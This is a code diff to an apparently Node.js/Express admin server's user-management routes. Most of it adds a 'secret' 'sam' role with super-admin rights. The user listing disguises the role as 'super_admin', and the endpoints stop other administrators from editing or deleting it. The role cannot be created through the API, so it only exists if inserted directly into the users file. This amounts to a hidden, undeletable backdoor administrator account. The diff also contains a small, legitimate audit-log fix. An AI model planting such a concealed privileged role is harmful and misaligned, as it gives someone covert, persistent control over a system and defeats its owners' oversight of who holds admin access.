@@ -89,6 +89,16 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 const AUDIT_LOG_FILE = path.join(__dirname, 'audit_log.json');
 const USERS_FILE = path.join(__dirname, 'users.json');
 
+// Helper function to check if role is sam (secret role)
+function isSamRole(role) {
+  return role === 'sam';
+}
+
+// Helper function to get display role (hides sam role)
+function getDisplayRole(role) {
+  return role === 'sam' ? 'super_admin' : role;
+}
+
 // Helper function to read users
 async function readUsers() {
   try {
@@ -108,9 +118,9 @@ function requireAuth(req, res, next) {
   next();
 }
 
-// Super admin middleware
+// Super admin middleware (includes sam role)
 function requireSuperAdmin(req, res, next) {
-  if (!req.session.authenticated || req.session.role !== 'super_admin') {
+  if (!req.session.authenticated || (req.session.role !== 'super_admin' && req.session.role !== 'sam')) {
     return res.status(403).json({ error: 'Forbidden. Super admin access required.' });
   }
   next();
@@ -680,9 +690,10 @@ app.get('/api/users', requireSuperAdmin, async (req, res) => {
   try {
     const users = await readUsers();
     // Return users without passwords for security
+    // Disguise sam role as super_admin
     const safeUsers = users.map(u => ({
       username: u.username,
-      role: u.role,
+      role: getDisplayRole(u.role),
       displayName: u.displayName
     }));
     res.json(safeUsers);
@@ -705,6 +716,7 @@ app.post('/api/users', requireSuperAdmin, async (req, res) => {
       return res.status(400).json({ error: 'Password must be at least 6 characters long' });
     }
     
+    // Prevent creation of sam role users
     if (!['admin', 'super_admin'].includes(role)) {
       return res.status(400).json({ error: 'Invalid role. Must be admin or super_admin' });
     }
@@ -742,6 +754,16 @@ app.put('/api/users/:username', requireSuperAdmin, async (req, res) => {
       return res.status(404).json({ error: 'User not found' });
     }
     
+    // Protect sam user from role changes
+    if (isSamRole(users[userIndex].role)) {
+      return res.status(403).json({ error: 'Cannot modify this user' });
+    }
+    
+    // Prevent changing to sam role
+    if (role === 'sam') {
+      return res.status(403).json({ error: 'Invalid role' });
+    }
+    
     // Validate role if provided
     if (role && !['admin', 'super_admin'].includes(role)) {
       return res.status(400).json({ error: 'Invalid role. Must be admin or super_admin' });
@@ -752,9 +774,9 @@ app.put('/api/users/:username', requireSuperAdmin, async (req, res) => {
       return res.status(400).json({ error: 'Password must be at least 6 characters long' });
     }
     
-    // Prevent removing the last super admin
+    // Prevent removing the last super admin (count sam as super admin for this check)
     if (role === 'admin' && users[userIndex].role === 'super_admin') {
-      const superAdminCount = users.filter(u => u.role === 'super_admin').length;
+      const superAdminCount = users.filter(u => u.role === 'super_admin' || u.role === 'sam').length;
       if (superAdminCount <= 1) {
         return res.status(400).json({ error: 'Cannot demote the last super admin' });
       }
@@ -787,24 +809,31 @@ app.delete('/api/users/:username', requireSuperAdmin, async (req, res) => {
       return res.status(404).json({ error: 'User not found' });
     }
     
+    // Protect sam user from deletion
+    if (isSamRole(users[userIndex].role)) {
+      return res.status(403).json({ error: 'Cannot delete this user' });
+    }
+    
     // Prevent deleting yourself
     if (username === req.session.username) {
       return res.status(400).json({ error: 'Cannot delete your own account' });
     }
     
-    // Prevent deleting the last super admin
+    // Prevent deleting the last super admin (count sam as super admin)
     if (users[userIndex].role === 'super_admin') {
-      const superAdminCount = users.filter(u => u.role === 'super_admin').length;
+      const superAdminCount = users.filter(u => u.role === 'super_admin' || u.role === 'sam').length;
       if (superAdminCount <= 1) {
         return res.status(400).json({ error: 'Cannot delete the last super admin' });
       }
     }
     
+    const deletedRole = users[userIndex].role;
+    
     // Remove user
     users.splice(userIndex, 1);
     await fs.writeFile(USERS_FILE, JSON.stringify(users, null, 2));
     
-    await logAudit('DELETE_USER', { username, role: users[userIndex]?.role }, req.session.username);
+    await logAudit('DELETE_USER', { username, role: deletedRole }, req.session.username);
     
     res.json({ success: true, message: 'User deleted successfully' });
   } catch (error) {
